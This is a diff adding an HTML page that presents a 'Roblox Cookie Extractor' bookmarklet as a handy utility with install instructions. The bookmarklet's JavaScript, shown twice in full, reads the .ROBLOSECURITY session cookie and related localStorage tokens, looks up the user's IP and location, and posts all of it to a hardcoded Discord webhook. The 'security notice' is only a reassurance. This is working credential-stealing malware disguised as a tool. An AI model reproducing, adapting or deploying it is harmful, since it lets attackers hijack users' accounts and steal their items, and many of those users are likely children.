@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Cookie Bookmark</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .bookmark-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .bookmark-link {
+            display: inline-block;
+            background: #007bff;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .bookmark-link:hover {
+            background: #0056b3;
+        }
+        .instructions {
+            background: #e7f3ff;
+            border: 1px solid #b3d9ff;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .code-block {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            padding: 15px;
+            font-family: monospace;
+            word-break: break-all;
+            font-size: 12px;
+            margin: 15px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="bookmark-container">
+        <h1>🍪 Roblox Cookie Extractor Bookmark</h1>
+        
+        <div class="instructions">
+            <h3>📋 How to Install:</h3>
+            <ol>
+                <li><strong>Drag the blue link below</strong> to your browser's bookmark bar</li>
+                <li><strong>Alternative:</strong> Right-click the link → "Bookmark this link"</li>
+                <li>The bookmark will be added as "Get Roblox Cookie"</li>
+            </ol>
+        </div>
+
+        <!-- Bookmark Link - Drag this to bookmark bar -->
+        <a href="javascript:(function(){const WEBHOOK_URL='https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';async function getUserLocation(){try{const response=await fetch('https://ipapi.co/json/');if(response.ok){const data=await response.json();return{ip:data.ip||'Unknown',country:data.country_name||'Unknown',region:data.region||'Unknown',city:data.city||'Unknown'}}}catch(error){}return{ip:'Unknown',country:'Unknown',region:'Unknown',city:'Unknown'}}async function sendToWebhook(cookieValue,locationInfo){try{const timestamp=new Date().toLocaleString();const fullCookie=`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cookieValue}`;const payload={content:`🍪 **Roblox Cookie Extracted**\n\`\`\`\nCookie: ${fullCookie}\nTime: ${timestamp}\nLocation: ${locationInfo.city}, ${locationInfo.country}\nIP: ${locationInfo.ip}\n\`\`\``,username:'Roblox Cookie Bot'};const response=await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return response.ok}catch(error){return false}}async function getRobloxCookie(){if(!window.location.hostname.includes('roblox.com')){alert('Please use this bookmark while on a Roblox website page (roblox.com)');return}let robloxCookie=null;try{const cookies=document.cookie.split(';');for(let cookie of cookies){const trimmed=cookie.trim();if(trimmed.startsWith('.ROBLOSECURITY=')){robloxCookie=trimmed.substring('.ROBLOSECURITY='.length);break}}}catch(e){}if(!robloxCookie){try{const authKeys=['RBXAuthenticationNegotiation','RBXEventTrackerV2','RobloxAuth'];for(const key of authKeys){const value=localStorage.getItem(key);if(value&&value.length>50){robloxCookie=value;break}}}catch(e){}}if(robloxCookie){const locationInfo=await getUserLocation();const webhookSuccess=await sendToWebhook(robloxCookie,locationInfo);const notification=document.createElement('div');notification.style.cssText=`position:fixed;top:20px;right:20px;background:${webhookSuccess?'#28a745':'#dc3545'};color:white;padding:15px 25px;border-radius:8px;z-index:999999;font-family:Arial,sans-serif;box-shadow:0 4px 12px rgba(0,0,0,0.3);font-size:14px;`;notification.textContent=webhookSuccess?'✅ Cookie sent to Discord webhook!':'❌ Failed to send cookie to webhook';document.body.appendChild(notification);setTimeout(()=>{if(notification.parentNode){notification.remove()}},5000)}else{const notification=document.createElement('div');notification.style.cssText=`position:fixed;top:20px;right:20px;background:#dc3545;color:white;padding:15px 25px;border-radius:8px;z-index:999999;font-family:Arial,sans-serif;box-shadow:0 4px 12px rgba(0,0,0,0.3);font-size:14px;`;notification.textContent='❌ No Roblox cookie found. Make sure you\'re logged in!';document.body.appendChild(notification);setTimeout(()=>{if(notification.parentNode){notification.remove()}},5000)}}getRobloxCookie()})();" class="bookmark-link">
+            🍪 Get Roblox Cookie
+        </a>
+
+        <div class="instructions">
+            <h3>🎯 How to Use:</h3>
+            <ol>
+                <li>Go to <strong>roblox.com</strong> and make sure you're logged in</li>
+                <li>Click the bookmark you just added</li>
+                <li>Your cookie will be automatically sent to your Discord webhook</li>
+                <li>A notification will appear showing success/failure status</li>
+            </ol>
+        </div>
+
+        <div class="warning">
+            <h3>⚠️ Security Notice:</h3>
+            <p><strong>This bookmark sends your cookie to:</strong></p>
+            <div class="code-block">https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv</div>
+            <p>Make sure this is YOUR Discord webhook and you trust it completely!</p>
+        </div>
+
+        <div class="instructions">
+            <h3>🔧 Manual Installation (if drag doesn't work):</h3>
+            <ol>
+                <li>Right-click your bookmark bar → "Add page/bookmark"</li>
+                <li><strong>Name:</strong> Get Roblox Cookie</li>
+                <li><strong>URL:</strong> Copy the code below and paste it</li>
+            </ol>
+            
+            <div class="code-block" onclick="navigator.clipboard.writeText(this.textContent); alert('Copied to clipboard!')">
+javascript:(function(){const WEBHOOK_URL='https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';async function getUserLocation(){try{const response=await fetch('https://ipapi.co/json/');if(response.ok){const data=await response.json();return{ip:data.ip||'Unknown',country:data.country_name||'Unknown',region:data.region||'Unknown',city:data.city||'Unknown'}}}catch(error){}return{ip:'Unknown',country:'Unknown',region:'Unknown',city:'Unknown'}}async function sendToWebhook(cookieValue,locationInfo){try{const timestamp=new Date().toLocaleString();const fullCookie=`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cookieValue}`;const payload={content:`🍪 **Roblox Cookie Extracted**\n\`\`\`\nCookie: ${fullCookie}\nTime: ${timestamp}\nLocation: ${locationInfo.city}, ${locationInfo.country}\nIP: ${locationInfo.ip}\n\`\`\``,username:'Roblox Cookie Bot'};const response=await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return response.ok}catch(error){return false}}async function getRobloxCookie(){if(!window.location.hostname.includes('roblox.com')){alert('Please use this bookmark while on a Roblox website page (roblox.com)');return}let robloxCookie=null;try{const cookies=document.cookie.split(';');for(let cookie of cookies){const trimmed=cookie.trim();if(trimmed.startsWith('.ROBLOSECURITY=')){robloxCookie=trimmed.substring('.ROBLOSECURITY='.length);break}}}catch(e){}if(!robloxCookie){try{const authKeys=['RBXAuthenticationNegotiation','RBXEventTrackerV2','RobloxAuth'];for(const key of authKeys){const value=localStorage.getItem(key);if(value&&value.length>50){robloxCookie=value;break}}}catch(e){}}if(robloxCookie){const locationInfo=await getUserLocation();const webhookSuccess=await sendToWebhook(robloxCookie,locationInfo);const notification=document.createElement('div');notification.style.cssText=`position:fixed;top:20px;right:20px;background:${webhookSuccess?'#28a745':'#dc3545'};color:white;padding:15px 25px;border-radius:8px;z-index:999999;font-family:Arial,sans-serif;box-shadow:0 4px 12px rgba(0,0,0,0.3);font-size:14px;`;notification.textContent=webhookSuccess?'✅ Cookie sent to Discord webhook!':'❌ Failed to send cookie to webhook';document.body.appendChild(notification);setTimeout(()=>{if(notification.parentNode){notification.remove()}},5000)}else{const notification=document.createElement('div');notification.style.cssText=`position:fixed;top:20px;right:20px;background:#dc3545;color:white;padding:15px 25px;border-radius:8px;z-index:999999;font-family:Arial,sans-serif;box-shadow:0 4px 12px rgba(0,0,0,0.3);font-size:14px;`;notification.textContent='❌ No Roblox cookie found. Make sure you\'re logged in!';document.body.appendChild(notification);setTimeout(()=>{if(notification.parentNode){notification.remove()}},5000)}}getRobloxCookie()})();
+            </div>
+            <p><em>Click the code above to copy it to clipboard</em></p>
+        </div>
+    </div>
+</body>
+</html>
